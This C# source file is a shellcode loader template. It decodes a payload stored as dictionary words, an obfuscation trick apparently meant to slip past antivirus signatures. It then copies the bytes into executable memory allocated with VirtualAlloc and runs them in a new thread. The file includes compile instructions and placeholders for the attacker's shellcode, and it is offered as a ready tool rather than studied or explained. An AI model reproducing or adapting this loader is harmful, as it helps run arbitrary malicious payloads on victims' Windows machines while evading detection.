/* 
C# Diction Shellcode Program

Compile EXE:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:exe /platform:x64 /out:DictionShellcode.exe CSHarp_DictionShellcode.cs
*/
using System;
using System.Text;
using System.Runtime.InteropServices;


class Program
{
    [DllImport("kernel32")]
    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    private static UInt32 MC = 0x1000;
    private static UInt32 PER = 0x40;

    // Shellcode translation Dictionary - SHELLCODE DICTIONARY GOES HERE
    static string[] translate_dict = new string[256] {  };

    static void Main(string[] args)
    {
        // Shellcode in Dictionary words format -> SUB YOUR SHELLCODE OUTPUT HERE AND UPDATE LENGTH
        string[] dict_words = new string[LENGTH] { };

        int shellcode_len = dict_words.Length;
        byte[] shellcode = new byte[shellcode_len];

        // Decode shellcode using input Dictionary wordlist "translate_dict"
        for (uint sc_index = 0; sc_index < shellcode_len; sc_index++) // Loop through shellcode words first
        {
            for (uint dict_index = 0; dict_index < 256; dict_index++) // Loop through all possible dictionary words second
            {
                // If the word was found in the shellcode Dictionary
                if (translate_dict[dict_index] == dict_words[sc_index]) {
                    // Convert shellcode to byte and add to output variable
                    shellcode[sc_index] = (byte)dict_index;
                    break;
                }
            }
        }

        // Allocate shellcode
        UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode_len, MC, PER);
        Marshal.Copy(shellcode , 0, (IntPtr)funcAddr, shellcode_len);

        IntPtr hThread = IntPtr.Zero;
        UInt32 threadId = 0;

        // Execute
        hThread = CreateThread(0, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
        WaitForSingleObject(hThread, 0xFFFFFFFF);

        return;
    }
}
